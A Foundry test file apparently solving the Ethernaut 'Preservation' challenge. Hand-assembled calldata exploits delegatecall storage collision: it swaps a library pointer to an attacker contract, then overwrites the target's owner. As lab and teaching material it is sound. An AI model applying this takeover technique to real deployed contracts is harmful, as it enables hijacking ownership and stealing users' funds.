pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";
import "../src/Preservation.sol";

contract Attack {
    function setTime(uint256 _timestamp) public {
        assembly {
            // cool optimization here in assembly:
            // we don't even need to define storage variables
            // because we can directly load our data into
            // a storage slot - in solidity we would need a
            // uint256[2] __gap first, then an owner variable
            sstore(2, _timestamp)
        }
    }
}

contract ASMPreservation is Test {
    address public attacker = address(420);
    Preservation public target;
    Attack attackContract;

    function setUp() public {
        target = new Preservation(
            address(new LibraryContract()),
            address(new LibraryContract())
        );
        attackContract = new Attack();
    }

    modifier attack() {
        vm.startPrank(attacker);
        _;
        vm.stopPrank();
    }

    function testASMPreservation() public attack {
        assembly {
            let ptr := mload(0x40)

            // string is length 22
            let len := 0x16
            mstore(ptr, "setSecondTime(uint256)")

            // 4 bytes == 32 bits == 0x20
            // shuffle is trimming and padding
            let shuffle := sub(0xff, 0x20)
            let selector := shl(shuffle, shr(shuffle, keccak256(ptr, len)))
            ptr := add(ptr, len)

            // store selector and move the pointer along 4 places past the function selector
            mstore(ptr, selector)
            ptr := add(ptr, 0x4)

            // now store the attack contract
            mstore(ptr, sload(attackContract.slot))
            ptr := add(ptr, 0x20)

            // execute the first call
            // calling setsecondtime with the timestamp as an address we control
            // will set the tiemzone1 lib
            let success := call(gas(), sload(target.slot), 0, sub(ptr, 0x24), 0x24, 0, 0)

            if eq(success, 0) { revert(0, 0) }

            // same again
            // string is length 21
            len := 0x15
            mstore(ptr, "setFirstTime(uint256)")

            // 4 bytes == 32 bits == 0x20
            // shuffle is trimming and padding
            selector := shl(shuffle, shr(shuffle, keccak256(ptr, len)))
            ptr := add(ptr, len)

            // store selector and move the pointer along 4 places past the function selector
            mstore(ptr, selector)
            ptr := add(ptr, 0x4)

            // now store the attack contract
            mstore(ptr, sload(attacker.slot))
            ptr := add(ptr, 0x20)

            // execute the first call
            // now we can set the owner by just matching the storage slot
            success := call(gas(), sload(target.slot), 0, sub(ptr, 0x24), 0x24, 0, 0)

            if eq(success, 0) { revert(0, 0) }
        }

        assertEq(target.owner(), attacker);
    }
}
